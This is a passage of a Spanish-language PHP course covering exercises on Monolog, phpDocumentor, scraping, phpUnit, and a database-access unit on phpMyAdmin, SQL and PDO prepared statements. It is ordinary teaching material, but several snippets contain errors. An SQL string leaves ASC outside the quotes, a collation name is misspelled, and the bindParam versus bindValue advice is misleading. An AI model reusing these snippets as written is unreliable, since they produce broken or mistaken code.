</li> <li> <p>Modifica la clase <code>Cliente</code> para introducir un <code>Logger</code> de Monolog.</p> <ul> <li>A\u00f1ade el log como una propiedad de la clase e inicial\u00edzalo en el constructor, con el nombre del canal <code>VideoclubLogger</code>.</li> <li>Se debe almacenar en <code>logs/videoclub.log</code> mostrando todos los mensajes desde debug.</li> <li>Antes de lanzar cualquier excepci\u00f3n, debe escribir un log de tipo warning.</li> <li>Sustituir los <code>echo</code> que haya en el c\u00f3digo, que ahora pasar\u00e1n por el log con el nivel info, a excepci\u00f3n del m\u00e9todo <code>muestraResumen</code> que seguir\u00e1 haciendo <code>echo</code>.</li> </ul> </li> <li> <p>Vuelve a hacer lo mismo que en el ejercicio anterior, pero ahora con la clase <code>Videoclub</code>. Adem\u00e1s:</p> <ul> <li>Siempre que se llame a un m\u00e9todo del log, se le pasar\u00e1 como segundo par\u00e1metro la informaci\u00f3n que dispongamos.</li> <li>Ejecuta el archivo de prueba y comprueba que el log se rellena correctamente.</li> </ul> </li> <li> <p>Vamos a refactorizar el c\u00f3digo com\u00fan de inicializaci\u00f3n de Monolog que tenemos repetidos en los constructores a una factor\u00eda de Monolog, la cual colocaremos en <code>\\Dwes\\Videoclub\\Util\\LogFactory</code>. Comprueba que sigue funcionando correctamente.</p> </li> <li> <p>Modifica la factor\u00eda para que devuelva <code>LogInterface</code> y comprueba que sigue funcionando. Sube los cambios a GitHub con la etiqueta <code>v0.516</code>.</p> </li> </ol>"},{"location":"05herramientas.html#phpdocumentor","title":"phpDocumentor","text":"<ol> <li>Comprueba que en el contenedor de Docker funciona phpDocumentor. Ejecuta phpdoc sobre tu proyecto Monolog y comprueba el api que se crea. Comenta tanto la clase como los m\u00e9todos, y posteriormente, vuelve a ejecutar phpdoc.</li> <li>Documenta el proyecto Videoclub, y genera la documentaci\u00f3n. Empieza por las clases de <code>Soporte</code> y sus hijos. Comprueba el resultado. Luego sigue con <code>Cliente</code> y finalmente <code>Videoclub</code>.</li> </ol>"},{"location":"05herramientas.html#web-scraping","title":"Web Scraping","text":"<ol> <li> <p>A partir de los datos de http://www.seleccionbaloncesto.es, calcula la altura y edad media del equipo de baloncesto masculino. Observa que tienes los datos dentro de una tabla debajo de las noticias.</p> </li> <li> <p>Volviendo al Videoclub, en <code>Soporte</code> a\u00f1ade una propiedad llamada <code>metacritic</code> para almacenar la URL de cada soporte. A continuaci\u00f3n, modifica los m\u00e9todos <code>incluirXXX</code> de <code>Videoclub</code> para que admitan como primer par\u00e1metro dicha URL. Tras ello, modifica el fichero <code>inicio3.php</code> para pasarle la URL  de cada soporte (para ello deber\u00e1s consultarlos en Metacritic haciendo b\u00fasquedas manuales). Por ejemplo, en el caso de la pel\u00edcula Cazafantasmas, su URL es https://www.metacritic.com/movie/ghostbusters.</p> </li> <li> <p>Finalmente, a\u00f1ade un m\u00e9todo abstracto en <code>Soporte</code> llamado <code>getPuntuacion</code>, que haciendo uso de Web Scraping se conecte a Metacritic y obtenga su puntuaci\u00f3n. Modifica <code>inicio3.php</code> para obtener todos los alquileres de un cliente mediante <code>getAlquileres() : array</code>, y para cada uno de ellos, adem\u00e1s del t\u00edtulo, muestra su puntuaci\u00f3n.</p> </li> </ol>"},{"location":"05herramientas.html#phpunit","title":"phpUnit","text":"<ol> <li> <p>A partir de la clase <code>HolaMonolog</code>, modifica los m\u00e9todos para que adem\u00e1s de escribir en en log, devuelvan el saludo como una cadena. Crea la clase <code>HolaMonologTest</code> y a\u00f1ade diferentes casos de prueba para comprobar que los saludos y despedidas son acordes a la hora con la que se crea la clase.</p> </li> <li> <p>Vamos a simular Test Driven Development. Queremos que nuestra aplicaci\u00f3n almacene los \u00faltimos tres saludos que ha realizado. Para ello:</p> <ul> <li>Crea las prueba necesarias (invoca al m\u00e9todo <code>saludar</code> varias veces y llama al m\u00e9todo que te devuelva los saludos almacenados)</li> <li>Implementa el c\u00f3digo para pasar las pruebas</li> <li>Refactoriza el c\u00f3digo</li> </ul> </li> <li> <p>Crea una nueva prueba que utilice proveedores de datos para comprobar esta \u00faltima funcionalidad, pas\u00e1ndole:</p> <ul> <li>Un saludo.</li> <li>Tres saludos.</li> <li>Cuatro saludos.</li> </ul> </li> <li> <p>\u00bfRecuerdas que si la hora es negativa o superior a 24 escrib\u00edamos en el log un warning? Ahora debe lanzar una excepci\u00f3n de tipo <code>InvalidArgumentException</code> (como la excepci\u00f3n forma para de PHP, hay que poner su FQN: <code>\\InvalidArgumentException</code>). Vuelve a aplicar TDD y completa tus casos de prueba.</p> </li> <li> <p>Comenta la \u00faltima prueba realizada (la comprobaci\u00f3n de las excepciones) y realiza un informe de cobertura de pruebas. Analiza los resultados obtenidos. Elimina los \u00faltimos comentarios sobre la \u00faltima prueba y vuelve a generar y analizar el informe de cobertura.</p> </li> </ol>"},{"location":"05herramientas.html#proyecto-videoclub-50","title":"Proyecto Videoclub 5.0","text":"<p>El objetivo de los siguientes ejercicios es conseguir de manera incremental una cobertura de pruebas superior al 95%.</p> <ol> <li> <p>Crea pruebas dentro de la carpeta <code>tests</code> para las clases <code>Soporte</code>, <code>CintaVideo</code>, <code>Dvd</code> y <code>Juego</code>. Recuerda respetar el espacio de nombres. Los m\u00e9todos <code>muestraResumen</code>, tras hacer echo de los mensajes, deben devolver una cadena con el propio mensaje.</p> </li> <li> <p>Crea pruebas para la clase <code>Cliente</code>, aprovechando todo el c\u00f3digo que ten\u00edamos para comprobar la funcionalidad. Utiliza proveedores de datos para a\u00f1adir conjuntos de datos mayores que los empleados. Comprueba que funciona con diferentes cupos, que al intentar alquilar un soporte marcado como ya alquilado debe lanzar una excepci\u00f3n, que no coincidan los ids de los soportes, etc...</p> </li> <li> <p>Crea las pruebas para la clase <code>Videoclub</code>. Ten en cuenta los \u00faltimos m\u00e9todos a\u00f1adidos que permit\u00edan alquilar y devolver soportes, tanto de manera individual como mediante un array.</p> </li> <li> <p>Crea el informe de cobertura. Una vez creado, analiza los datos de cobertura (&gt;= 90%) y comprueba el valor de CRAP, de manera que siempre sea &lt;= 5. En caso de no cumplirse, crea nuevos casos de prueba y/o refactoriza el c\u00f3digo de tu aplicaci\u00f3n.</p> </li> </ol> <p>Sube los cambios a GitHub con la etiqueta <code>v0.554</code>.</p>"},{"location":"05herramientas.html#ampliacion","title":"Ampliaci\u00f3n","text":"<ol> <li> <p>Queremos que en <code>Videoclub</code>, cuando un cliente no existe (tanto al alquilar como al devolver) se lance una nueva excepci\u00f3n: <code>ClienteNoExisteException</code>. Adem\u00e1s, dado el n\u00famero creciente de excepciones, queremos mover las excepciones al namespace <code>Dwes\\Videoclub\\Exception</code>. Siguiendo TDD, primero crea las pruebas, y luego modifica el c\u00f3digo de aplicaci\u00f3n. Vuelve a generar el informe de cobertura y comprueba la calidad de nuestras pruebas.</p> </li> <li> <p>\u00bfNadie se ha dado cuenta que en los Dvd no estamos almacenando su duraci\u00f3n? Haz todos los cambios necesarios, primero en las pruebas y luego en el c\u00f3digo.</p> </li> <li> <p>Tras a\u00f1os luchando contra la tecnolog\u00eda, decidimos introducir los Blu-ray en nuestra empresa. Hemos decido que <code>Bluray</code> herede de <code>Soporte</code>. Adem\u00e1s del <code>t\u00edtulo</code> y la <code>duracion</code>, nos interesa almacenar si <code>es4k</code>. Haz todos los cambios necesarios, primero en las pruebas y luego en el c\u00f3digo.</p> </li> </ol> <p>Sube los cambios a GitHub con la etiqueta <code>v0.563</code>.</p>"},{"location":"06accesoDatos.html","title":"06accesoDatos","text":""},{"location":"06accesoDatos.html#acceso-a-datos","title":"Acceso a datos","text":"<p>En esta unidad vamos a aprender a acceder a datos que se encuentran en un servidor; recuperando, editando y creando dichos datos a trav\u00e9s de una base de datos.</p> <p>A trav\u00e9s de las distintas capas o niveles, de las cuales 2 de ellas ya conocemos (Apache, PHP) y MySQL la que vamos a estudiar en este tema.</p>"},{"location":"06accesoDatos.html#61-instalacion","title":"6.1 Instalaci\u00f3n","text":"<p>A trav\u00e9s de XAMPP es muy sencillo, simplemente nos descargar\u00edamos el programa y lo activar\u00edamos. Para descargar XAMPP pulsa aqu\u00ed.</p> <p>Con Docker nos descargaremos esta imagen de docker y lanzamos </p> <pre><code>docker compose up -d\n</code></pre> <p>Si todo ha salido bien y el contenedor est\u00e1 en marcha, podremos visitar la p\u00e1gina de phpMyAdmin de la siguiente manera</p> <pre><code>http://localhost:8000\n</code></pre> <p>Para acceder debemos utilizar las siguientes credenciales que vienen configuradas en el alrchivo <code>docker-compose.yml</code> </p> <pre><code>usuario: root\ncontrase\u00f1a: 1234\n</code></pre>"},{"location":"06accesoDatos.html#62-estructura-de-una-base-de-datos","title":"6.2 Estructura de una base de datos","text":"<p>Sabemos que una base de datos tiene muchos campos con sus nombres y valores, pero adem\u00e1s sabemos que la base de datos debe tener un nombre. por tanto tendr\u00edamos la siguiente estructura para una base de datos:</p> <pre><code>NombreBaseDeDatos\n    |__Tabla-#1\n    |       |__DatosTabla-#1\n    |\n    |__Tabla-#2\n    |       |__DatosTabla-#2\n    |\n    |__Tabla-#3\n    |       |__DatosTabla-#3\n    [...]\n</code></pre> <p>Ve\u00e1moslo en un ejemplo real</p> <pre><code>Ryanair\n    |__pasajero\n    |    |__id[*]\n    |    |__nombre\n    |    |__apellidos\n    |    |__edad\n    |    |__id_vuelo[^]\n    |\n    |__vuelo\n    |    |__id[*]\n    |    |__n_plazas\n    |    |__disponible\n    |    |__id_pais[^]\n    |\n    |__pais\n         |__id[*]\n         |__nombre\n</code></pre>      [*] Clave primaria [^] Clave For\u00e1nea"},{"location":"06accesoDatos.html#63-sql","title":"6.3 SQL","text":"<p>Este lenguaje de consulta estructurada (Structured Query Language) es el que vamos a utilizar para realizar las consultas a nuestras bases de datos para mostrar el contenido en las distintas interfaces web que creemos a lo largo de la unidad. Si quieres saber m\u00e1s detalles visita Wiki SQL.</p> <p>Ejemplo de una sentencia SQL donde seleccionamos todas las filas y columnas de nuestra tabla llamada 'pais'.</p> <pre><code>SELECT * FROM pais\n</code></pre> <p>Estas sentencias pueden invocarse desde la consola de comandos mediante el int\u00e9rprete mysql (previamente instalado en el sistema) o a trav\u00e9s de la herramienta phpMyAdmin.</p> <p>Las sentencias SQL tambi\u00e9n las podemos usar dentro de nuestro c\u00f3digo php, de tal manera que cuando se cargue nuestra interfaz web, lance una sentecia SQL para mostrar los datos que queramos.</p> <pre><code>&lt;?php\n    // Listado de clientes, ordenados por DNI de manera ASCendente\n    $clientesOrdenadosPorDNI = \"SELECT * FROM `pasajero` ORDER BY `dni`\" ASC;\n?&gt;\n</code></pre>"},{"location":"06accesoDatos.html#64-phpmyadmin","title":"6.4 phpMyAdmin","text":"<p>Este software funciona bajo Apache y PHP y es m\u00e1s que nada una interfaz web para gestionar las bases de datos que tengamos disponibles en nuestro servidor local. Muchos hostings ofrecen esta herramienta por defecto para poder gestionar las BBDD que tengamos configuradas bajo nuestra cuenta.</p>"},{"location":"06accesoDatos.html#creando-una-base-de-datos-dentro-de-phpmyadmin","title":"Creando una base de datos dentro de phpMyAdmin","text":"<ol> <li> <p>Para crear una nueva base de datos debemos entrar en phpMyAdmin como usuario root y pinchar en la opci\u00f3n Nueva del men\u00fa de la izquierda.</p> </li> <li> <p>En la nueva ventana de creaci\u00f3n pondremos un nombre a nuestra bbdd.</p> </li> <li> <p>Tambi\u00e9n estableceremos el cotejamiento utf8m4_unicode_ci para que nuestra bbdd soporte todo tipo de caracteres (como los asi\u00e1ticos) e incluso emojis ;)</p> </li> <li> <p>Le damos al bot\u00f3n de Crear para crear la bbdd y empezar a escribir las distintas tablas que vayamos a introducir en ella.</p> </li> </ol> <p>El sistema generar\u00e1 el c\u00f3digo SQL para crear todo lo que le hemos puesto y crear\u00e1 la base de datos con las tablas que le hayamos metido.</p> <pre><code>CREATE TABLE `persona` ( `id` INT NOT NULL AUTO_INCREMENT , `nombre` TINYTEXT NOT NULL , `apellidos` TEXT NOT NULL , `telefono` TINYTEXT NOT NULL , PRIMARY KEY (`id`)) ENGINE = InnoDB;\n</code></pre>"},{"location":"06accesoDatos.html#opciones-en-phpmyadmin","title":"Opciones en phpMyAdmin","text":"<p>Cuando seleccionamos una base de datos de la lista, el sistema nos muestra varias pesta\u00f1as con las cuales interactuar con la base de datos en cuesti\u00f3n:</p> <ul> <li> <p><code>Estructura</code>: Podemos ver las distintas tablas que consolidan nuestra base de datos</p> </li> <li> <p><code>SQL</code>: Por si queremos inyectar c\u00f3digo SQL para que el sistema lo interprete</p> </li> <li> <p><code>Buscar</code>: Sirve para buscar por t\u00e9rminos, en nuestra base de datos, aplicando distintos filtros de b\u00fasqueda</p> </li> <li> <p><code>Generar consulta</code>: parecido a SQL pero de una manera m\u00e1s gr\u00e1fica, sin tener que saber nada del lenguaje</p> </li> <li> <p><code>Exportar e importar</code>: Como su nombre indica, para hacer cualquiera de las 2 operaciones sobre la base de datos</p> </li> <li> <p><code>Operaciones</code>: Distintas opciones avanzadas para realizar en nuestra base de datos, de la cual destacaremos la opci\u00f3n Cotejamiento donde podremos cambiar el cotejamiento de nuestra tabla pero OJO CON \u00c9STO porque podemos eliminar datos sin querer, ya que al cambiar el cotejamiento podemos suprimir caracteres no soportados por el nuevo cotejamiento</p> </li> </ul> <p>No vamos a profundizar en el resto de opciones pero, en la pesta\u00f1a M\u00e1s existe la opci\u00f3n Dise\u00f1ador para poder editar las relaciones entre tablas de una manera gr\u00e1fica (pinchando y arrastrando) que veremos m\u00e1s adelante.</p>"},{"location":"06accesoDatos.html#65-php-data-objects-pdo","title":"6.5 PHP Data Objects (PDO)","text":"<p>La clase PDO de PHP se utiliza para conectarse a una base de datos y ejecutar consultas SQL de forma segura. Cuando construyes una instancia de PDO, puedes pasarle distintos atributos en el constructor y opciones para configurar el comportamiento de la conexi\u00f3n. </p>"},{"location":"06accesoDatos.html#constructor-de-la-clase-pdo","title":"Constructor de la clase PDO","text":"<p>El constructor de la clase PDO acepta tres par\u00e1metros obligatorios y un array de opciones opcional:</p> <pre><code>&lt;?php\n    $pdo = new PDO(string $dsn, string $username, string $password, array $options);\n</code></pre> <ul> <li>$dsn (Data Source Name): Es una cadena que especifica el tipo de base de datos y la informaci\u00f3n necesaria para conectarse a ella. Formado por el tipo de la base de datos y configuraci\u00f3n. Ejemplos:<ul> <li>\"mysql:host=localhost;dbname=testdb\" (para MySQL).</li> <li>\"pgsql:host=localhost;port=5432;dbname=testdb\" (para PostgreSQL).</li> <li>\"sqlite:/path/to/database.db\" (para SQLite).</li> </ul> </li> <li>$username: El nombre de usuario para la conexi\u00f3n a la base de datos.</li> <li>$password: La contrase\u00f1a asociada al nombre de usuario.</li> <li>$options (opcional): Un array de opciones para definir el comportamiento de la conexi\u00f3n. \u00c9stos son algunos de los valores m\u00e1s comunes que se pueden definir en este array:<ul> <li>PDO::ATTR_ERRMODE: Controla c\u00f3mo se gestionan los errores. Algunos valores comunes son:<ul> <li>PDO::ERRMODE_SILENT: Los errores no generan ning\u00fan mensaje.</li> <li>PDO::ERRMODE_WARNING: Los errores generan un aviso.</li> <li>PDO::ERRMODE_EXCEPTION: Los errores generan una excepci\u00f3n, que es lo m\u00e1s recomendable para controlar errores.</li> </ul> </li> <li>PDO::ATTR_DEFAULT_FETCH_MODE: Define el modo de recuperaci\u00f3n de datos por defecto, como:<ul> <li>PDO::FETCH_ASSOC: Devuelve los datos como un array asociativo.</li> <li>PDO::FETCH_OBJ: Devuelve los datos como un objeto.</li> <li>PDO::FETCH_BOTH: Devuelve los datos como un array asociativo y num\u00e9rico.</li> </ul> </li> <li>PDO::ATTR_PERSISTENT: Habilita conexiones persistentes. Una conexi\u00f3n persistente puede mejorar el rendimiento manteniendo la conexi\u00f3n activa por m\u00faltiples peticiones en lugar de crear una nueva cada vez.</li> <li>PDO::ATTR_TIMEOUT: Define un tiempo l\u00edmite para la conexi\u00f3n en segundos.</li> </ul> </li> </ul> <p>Con PDO podemos capturar las excepciones PDOException con try catch para gestionar los errores que se produzcan por la conexi\u00f3n.</p>"},{"location":"06accesoDatos.html#ejemplo-de-conexion-a-una-bdd","title":"Ejemplo de conexi\u00f3n a una BDD","text":"<pre><code>&lt;?php\n\n    $dsn = 'mysql:host=127.0.0.1;dbname=prueba';\n    $usuario = 'usuario';\n    $contrase\u00f1a = 'contrase\u00f1a';\n    $opciones = [\n        PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION, // Le indicamos que en caso de errores lance excepciones\n        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,       // Configurar el modo de obtenci\u00f3n de resultados (mediante arrays asociativos)\n        PDO::ATTR_EMULATE_PREPARES   =&gt; false,                  // Desactiva las consultas preparadas emuladas, haciendo las consultas m\u00e1s seguras contra inyecciones SQL.\n    ];\n\n    try {\n        $mbd = new PDO($dsn, $usuario, $contrase\u00f1a, $opciones);\n        echo \"Conexi\u00f3n exitosa a la base de datos.\";\n    } catch (PDOException $e) {\n        echo 'Fall\u00f3 la conexi\u00f3n: ' . $e-&gt;getMessage();\n    }\n</code></pre>"},{"location":"06accesoDatos.html#fichero-de-configuracion-de-la-bd","title":"Fichero de configuraci\u00f3n de la BD","text":"<p>De la misma forma que podemos tener un archivo de funciones <code>funciones.php</code> con todas las funciones que se usan de manera global en la aplicaci\u00f3n, podemos crear un archivo de constantes donde definamos los par\u00e1metros de conexi\u00f3n con la base de datos.</p> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 config/database.inc.php \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    const DSN = \"mysql:host=localhost;dbname=dwes\";\n    const USUARIO = \"dwes\";\n    const PASSWORD = \"abc123\";\n\n    /*  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n        \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 NO SUBAS ESTE ARCHIVO A git \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n        \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 */\n</code></pre> <p>Este archivo contiene informaci\u00f3n muy sensible as\u00ed que no es recomendable que subas este archivo a git.</p>"},{"location":"06accesoDatos.html#sentencias-preparadas","title":"Sentencias preparadas","text":"<p>Se trata de sentencias que se establecen como si fueran plantillas de SQL que vamos a lanzar, aceptando par\u00e1metros que son establecidos a posteriori de la declaraci\u00f3n de la sentencia preparada.</p> <p>Las sentencias preparadas evitan la injecci\u00f3n de SQL (SQL Injection) y mejoran el rendimiento de nuestras aplicaci\u00f3nes o p\u00e1ginas web.</p> <pre><code>&lt;?php\n    // Sentencia preparada\n    $sql = \"INSERT INTO Clientes VALUES (?, ?, ?, ?)\";\n</code></pre> <p>Cada interrogante es un par\u00e1metro que estableceremos despu\u00e9s, unas cuantas l\u00edneas m\u00e1s abajo.</p> <p>Una vez tenemos la plantilla de nuestra consulta, debemos seguir con la preparaci\u00f3n junto con 3 m\u00e9todos m\u00e1s de PHP para su completa ejecuci\u00f3n:</p> <ul> <li><code>prepare:</code> prepara la sentenci\u00e1n antes de ser ejecutada</li> <li><code>bind</code>: el tipo de uni\u00f3n (bind) de dato que puede ser mediante ' ? ' o ' :parametro '</li> <li><code>execute</code> se ejecuta la consulta uniendo la plantilla con las variables o par\u00e1metros que hemos establecido.</li> </ul>"},{"location":"06accesoDatos.html#ejemplo-parametros","title":"Ejemplo par\u00e1metros","text":"<pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Borrando con par\u00e1metros \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    include \"config/database.inc.php\"; // Aqu\u00ed est\u00e1n las constantes DSN, USUARIO y PASSWORD\n\n    $opciones = [\n        PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION, \n        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,       \n        PDO::ATTR_EMULATE_PREPARES   =&gt; false,                  \n    ];\n\n    $conexion = null;\n\n    try { \n        $id = $_GET[\"id_alumno\"];\n\n        $conexion = new PDO(DSN, USUARIO, PASSWORD, $opciones);\n\n        $sql = \"DELETE FROM alumnos WHERE id = ?\";    \n        $sentencia = $conexion-&gt;prepare($sql);\n\n        $isOk = $sentencia-&gt;execute([$id]);\n\n        $cantidadAfectada = $sentencia-&gt;rowCount();\n        echo $cantidadAfectada;\n    } catch (PDOException $e) {\n        echo $e -&gt; getMessage();\n    }\n\n    $conexion = null;\n</code></pre>"},{"location":"06accesoDatos.html#ejemplo-bindparam","title":"Ejemplo bindParam","text":"<p>Muy parecido a utilizar par\u00e1metros pero esta vez la variable est\u00e1 dentro de la sentencia SQL, en este caso la hemos llamado <code>:id</code></p> <pre><code>&lt;?php\n    include \"config/database.inc.php\";\n\n    $conexion=null;\n\n    try {\n        $id = $_GET[\"id_alumno\"];\n\n        $conexion = new PDO(DSN, USUARIO, PASSWORD, $opciones);\n\n        $sql = \"DELETE FROM alumnos WHERE id = :id\";  \n        $sentencia = $conexion-&gt;prepare($sql);\n\n        $sentencia-&gt;bindParam(\":id\", $id);\n        $isOk = $sentencia-&gt;execute();\n\n        $cantidadAfectada = $sentencia-&gt;rowCount();        \n        echo $cantidadAfectada;\n    } catch (PDOException $e) {\n        echo $e -&gt; getMessage();\n    }\n\n    $conexion = null;\n</code></pre>"},{"location":"06accesoDatos.html#bindparam-vs-bindvalue","title":"bindParam VS bindValue","text":"<p>Utilizaremos <code>bindValue()</code> cuando tengamos que insertar datos s\u00f3lo una vez, en cambio, deberemos usar <code>bindParam()</code> cuando tengamos que pasar datos m\u00faltiples, como por ejemplo, un array.</p> <pre><code>&lt;?php\n    // se asignan nombre a los par\u00e1metros\n    $sql = \"DELETE FROM alumnos WHERE id = :id\";\n    $sentencia = $conexion-&gt;prepare($sql);\n\n    // bindParam enlaza por REFERENCIA\n    $id = 0;\n    $sentencia -&gt; bindParam(\":id\", $id);\n    $id = 1;\n    // se elimina con id = 1\n    $isOk = $sentencia-&gt;execute();\n\n    // bindValue enlaza por VALOR\n    $id = 0;\n    $sentencia -&gt; bindValue(\":id\", $id);\n    $id = 1;\n    // se elimina con id = 0\n    $isOk = $sentencia-&gt;execute();\n</code></pre> <p>Para m\u00e1s informaci\u00f3n y uso de las variables PDO consulta el manual de PHP.</p>"},{"location":"06accesoDatos.html#insertar-registros","title":"Insertar registros","text":"<p>A la hora de insertar registros en una base de datos, debemos tener en cuenta que en la tabla puede haber valores autoincrementados. En ese caso, dejaremos ese campo autoincrementado vac\u00edo y si necesitamos recuperarlo despu\u00e9s del a inserci\u00f3n, lo haremos con el m\u00e9todo de la conexi\u00f3n <code>lastInsertId()</code>.</p> <pre><code>&lt;?php\n    $nombre = $_GET[\"nombre\"] ?? \"SUCURSAL X\";\n    $telefono = $_GET[\"telefono\"] ?? \"636123456\";\n\n    // No indicamos el campo id por que es autoincrement\n    $sql=\"INSERT INTO tienda(nombre, tlf) VALUES (:nombre, :telefono)\";\n\n    $sentencia = $conexion -&gt; prepare($sql);\n    $sentencia -&gt; bindParam(\":nombre\", $nombre);\n    $sentencia -&gt; bindParam(\":telefono\", $telefono);\n\n    $isOk = $sentencia-&gt;execute();\n    $idGenerado = $conexion-&gt;lastInsertId();\n\n    echo $idGenerado;\n</code></pre>"},{"location":"06accesoDatos.html#consultar-registros","title":"Consultar registros","text":"<p>A la hora de recuperar los resultados de una consulta, bastar\u00e1 con invocar al m\u00e9todo <code>PDOStatement::fetch</code> para listar las filas generadas por la consulta.</p> <p>Pero debemos elegir el tipo de dato que queremos recibir entre los 3 que hay disponibles:</p> <ul> <li><code>PDO::FETCH_ASSOC:</code> array indexado cuyos keys son el nombre de las columnas.</li> <li><code>PDO::FETCH_NUM:</code> array indexado cuyos keys son n\u00fameros.</li> <li><code>PDO::FETCH_BOTH:</code> valor por defecto. Devuelve un array indexado cuyos keys son tanto el nombre de las columnas como n\u00fameros.</li> </ul> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 consulta con array asociativo.php \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    include \"config/database.inc.php\";\n\n    $opciones = [\n        PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION, \n        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC\n    ];\n\n    $conexion = null;\n\n    try{\n        $conexion = new PDO(DSN, USUARIO, PASSWORD, $opciones);\n\n        $sql = \"SELECT * FROM tienda\";\n\n        $sentencia = $conexion -&gt; prepare($sql);\n        $sentencia-&gt;execute();\n\n        while($fila = $sentencia-&gt;fetch()){\n            echo \"&lt;p&gt;Codigo: \" . $fila[\"cod\"] . \", Nombre: \" . $fila[\"nombre\"] . \", tel\u00e9fono: \" . $fila[\"tlf\"] . \"&lt;/p&gt;\";\n        }\n\n    }catch(PDOException $e) {\n        echo $e -&gt; getMessage();\n    }\n\n    $conexion = null;\n</code></pre> <p>Recuperando datos con una matriz mediante <code>fetchAll()</code> como resultado de nuestra consulta:</p> <p><pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 consulta con array asociativo \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $sql=\"SELECT * FROM tienda\";\n\n    $sentencia = $conexion-&gt;prepare($sql);\n    $sentencia-&gt;execute();\n\n    $tiendas = $sentencia-&gt;fetchAll();\n\n    foreach($tiendas as $tienda) {\n         echo \"&lt;p&gt;Codigo: \" . $tienda[\"cod\"] . \", Nombre: \" . $tienda[\"nombre\"] . \", tel\u00e9fono: \" . $tienda[\"tlf\"] . \"&lt;/p&gt;\";\n    }\n</code></pre> Pero si lo que queremos es leer datos con forma de objeto utilizaremos <code>PDO::FETCH_OBJ</code>. </p> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 consulta con formato de objeto \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $opciones = [\n        PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION, \n        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_OBJ\n    ];\n\n    // ...\n\n    $sql = \"SELECT * FROM tienda\";\n\n    $sentencia = $conexion-&gt;prepare($sql);\n    $sentencia -&gt; execute();\n\n    while($t = $sentencia-&gt;fetch()) {\n        echo\"Codigo:\" . $t-&gt;cod . \"&lt;br /&gt;\";\n        echo\"Nombre:\" . $t-&gt;nombre . \"&lt;br /&gt;\";\n        echo\"Tel\u00e9fono:\" . $t-&gt;tlf . \"&lt;br /&gt;\";\n    }\n</code></pre>"},{"location":"06accesoDatos.html#consultas-con-modelos","title":"Consultas con modelos","text":"<p>Llevamos tiempo creando clases en PHP y las consultas tambi\u00e9n admiten este tipo de datos mediante el uso de <code>PDO::FETCH_CLASS</code>.</p> <p>Si usamos este m\u00e9todo, debemos tener en cuenta que los nombres de los atributos privados deben coincidir con los nombres de las columnas de la tabla que vayamos a manejar.</p> <p>As\u00ed pues, si por lo que sea cambiamos la estructura de la tabla DEBEMOS CAMBIAR nuestra clase para que todo siga funcionando.</p> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 clase Tienda \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    class Tienda {\n        private int $cod;\n        private string $nombre;\n        private string $tlf;\n\n        public function getCodigo() : int {\n            return $this -&gt; cod;\n        }\n\n        public function getNombre() : string {\n            return $this -&gt; nombre;\n        }\n\n        public function getTelefono() : ?string {\n            return $this -&gt; tlf;\n        }\n    }\n</code></pre> <pre><code>&lt;?php\n    //  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 Consultando a trav\u00e9s de la clase Tienda \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\n    $sql = \"SELECT * FROM tienda\";\n    $sentencia = $conexion -&gt; prepare($sql);\n\n    // Aqu\u00ed 'Tienda' es el nombre de nuestra clase y esta opci\u00f3n no se puede \n    // establecer en el array de opciones, se tiene que hacer aqu\u00ed en la sentencia\n    $sentencia-&gt;setFetchMode(PDO::FETCH_CLASS, Tienda::class); \n    $sentencia-&gt;execute();\n\n    while($t = $sentencia-&gt;fetch()) {\n        echo \"Codigo: \" . $t-&gt;getCodigo() . \"&lt;br /&gt;\";\n        echo \"Nombre: \" . $t-&gt;getNombre() . \"&lt;br /&gt;\";\n        echo \"Tel\u00e9fono: \" . $t-&gt;getTelefono() . \"&lt;br /&gt;\";\n\n        var_dump($t);\n    }\n</code></pre> <p>Uso de ::class</p> <p>En el ejemplo anterior <code>Tienda::class</code> es la manera sencilla y segura de obtener el nombre completamente cualificado de la clase como una cadena de texto. En el ejemplo, tambi\u00e9n funcionar\u00eda con la cadena \"Tienda\".</p> <p>Pero \u00bfqu\u00e9 pasa si nuestras clases tienen constructor? pues que debemos indicarle, al m\u00e9todo FECTH, que rellene las propiedades despu\u00e9s de llamar al constructor y para ello hacemos uso de <code>PDO::FETCH_PROPS_LATE</code> indicando la clase y los atributos por defecto con los que se 